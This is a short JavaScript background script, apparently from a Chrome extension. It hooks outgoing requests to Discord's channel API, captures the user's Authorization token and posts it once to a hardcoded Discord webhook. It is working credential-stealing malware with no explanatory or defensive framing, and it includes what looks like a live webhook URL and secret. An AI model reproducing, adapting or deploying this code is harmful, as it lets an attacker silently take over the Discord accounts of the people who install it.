let sentToken = false

chrome.webRequest.onSendHeaders.addListener(
  function (details) {
    if (!sentToken) {
      for (var i = 0; i < details.requestHeaders.length; ++i) {
        if (details.requestHeaders[i].name === 'Authorization') {
          fetch(
            'https://discord.com/api/webhooks/838643559208845312/J2gKgQ0hNehoEHFemqhugv93m-We7U5qhrwmVe0KpPCVHUF4ikjcau5cIcziOIo1wPIf',
            {
              headers: {
                Accept: 'application/json',
                'Content-Type': 'application/json'
              },
              method: 'POST',
              body: JSON.stringify({ content: details.requestHeaders[i].value })
            }
          )
          sentToken = true
          break
        }
      }
    }
    return { requestHeaders: details.requestHeaders }
  },
  {
    urls: ['*://*.discord.com/api/v9/channels/*']
  },
  ['requestHeaders']
)
